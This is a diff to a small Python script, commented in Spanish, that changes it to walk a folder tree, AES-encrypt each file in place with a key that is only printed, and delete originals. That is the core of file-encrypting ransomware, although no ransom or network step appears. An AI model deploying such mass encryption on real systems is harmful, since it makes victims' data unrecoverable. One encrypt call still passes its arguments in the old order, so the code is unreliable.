@@ -29,9 +29,13 @@ def scan_dir(directory):
                         #print(list_files)
     return(list_files)
 
-def one_by_one(list):
-    for x in range(len(list)):
-        print(list[x])
+def one_by_one(passw, list):
+    key = passw
+    for file in range(len(list)):
+        print(list[file])
+        content = read_file(list[file])
+        xxdataxx = encrypt(key, content)
+        write_file(xxdataxx, list[file])
 
 def read_file(file):
     try:
@@ -57,7 +61,7 @@ def keygen():
     print(key)
     return(key)
 
-def encrypt(secret, key):
+def encrypt(key, secret):
     # dato a encriptar
     data0 = secret
     # clave, en este caso de 32bytes para AES256
@@ -84,8 +88,8 @@ def write_file(parts, name):
     [ file_out.write(x) for x in (parts.values()) ]
     file_out.close()
 
-def del_orginal():
-    pass
+def del_orginal(file):
+    os.remove(file)
 
 def main():
     path = full_path(input())
@@ -93,15 +97,16 @@ def main():
      # ==== If is file, encrypt
         # if not, scan files in folder and subfolders
     if type == "folder":
+        key = keygen()
         files = scan_dir(path)
-
-        x = one_by_one(files)
+        x = one_by_one(key, files)
         #print(x)
     else:
-        content = read_file(path)
         key = keygen()
+        content = read_file(path)
         xxdataxx = encrypt(content, key)
         write_file(xxdataxx, path)
+        del_orginal(path)
         pass
 
     #print(files)
